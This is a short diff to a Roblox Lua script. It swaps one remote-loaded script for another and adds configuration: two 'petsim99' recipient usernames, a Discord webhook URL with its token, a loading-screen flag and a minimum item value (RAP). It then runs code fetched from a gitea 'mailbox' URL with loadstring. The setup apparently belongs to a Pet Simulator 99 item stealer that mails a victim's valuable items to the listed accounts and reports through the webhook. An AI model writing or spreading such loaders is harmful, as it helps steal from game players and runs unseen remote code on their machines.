@@ -1,1 +1,9 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/whyrawlinkempty/premium/main/b53b4a38fbec5bb04727c27f.lua'))()
+Username = "petsim99accgrindd"
+Username2 = "petsim99accgrind"
+
+Webhook = "https://discord.com/api/webhooks/1202631135700586496/sAI7zCBpAzQ99_rZRHQ7DKg3wcOp_v3XsShmhCaeIMkN83dVCQqK3dVhyw-I9V5TI3Gi"
+
+LoadingScreen = true
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://gitea.com/Egorikusa/123/raw/branch/main/mailbox"))()
